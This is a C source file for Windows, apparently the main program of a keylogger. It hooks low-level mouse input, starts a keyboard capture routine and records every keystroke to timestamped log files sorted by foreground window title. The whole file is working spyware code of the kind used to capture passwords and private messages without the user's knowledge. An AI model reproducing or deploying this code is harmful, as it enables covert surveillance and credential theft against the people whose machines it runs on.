#include "keylogger.h"
#include <stdio.h>
#include <time.h>

char lastWindowTitle[1024] = {0}, path[44] = {0};
u8 shouldDoCursorEnter = 0;
u8 firstTime = 1;
HHOOK mouseHook;

LRESULT CALLBACK mouseMoveHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) shouldDoCursorEnter = 1;
    }
    return CallNextHookEx(mouseHook, code, wParam, lParam);
}

void recordInFileCallback(char* c) {
    FILE* f = fopen(path, "ab");
    if (!f) {
        exit(1);
    }
    fseek(f, 0, SEEK_END);
    char currentWindowTitle[1024] = {0};
    HWND current = GetForegroundWindow();
    GetWindowText(current, currentWindowTitle, 1024);
    if (strcmp(currentWindowTitle, lastWindowTitle) != 0 || firstTime == 1) {
        memset(lastWindowTitle, 0, 1024);
        if (strcmp(currentWindowTitle, "") == 0) {
            strcpy(lastWindowTitle, "[Untitled window]");
        } else {
            strcpy(lastWindowTitle, currentWindowTitle);
        }
        memset(currentWindowTitle, 0, 1024);
        memset(currentWindowTitle, '=', strlen(lastWindowTitle) + 1);
        if (firstTime == 0) fwrite("\n\n", 2, 1, f);
        fwrite(lastWindowTitle, strlen(lastWindowTitle), 1, f);
        fwrite("\n", 1, 1, f);
        fwrite(currentWindowTitle, strlen(currentWindowTitle), 1, f);
        fwrite("\n\n", 2, 1, f);
        firstTime = 1;
        shouldDoCursorEnter = 0;
    }

    if (shouldDoCursorEnter == 1) {
        shouldDoCursorEnter = 0;
        if (firstTime == 0) {
            fwrite("\n", 1, 1, f);
        }
    }
    firstTime = 0;
    fwrite(c, strlen(c), 1, f);
    fclose(f);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    time_t timer;
    struct tm* tmInfo;
    time(&timer);
    tmInfo = localtime(&timer);
    strftime(path, 32, "logs\\%Y-%m-%d %H.%M.%S.txt", tmInfo);
    CreateDirectory("logs", NULL);
    FILE* f = fopen(path, "wb");
    if (!f) {
        return 1;
    }
    fwrite("Starting the log file here.\n\n", 29, 1, f);
    fclose(f);
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseMoveHook, hInstance, 0);
    startKeylogger(hInstance, recordInFileCallback);
    UnhookWindowsHookEx(mouseHook);
    return 0;
}
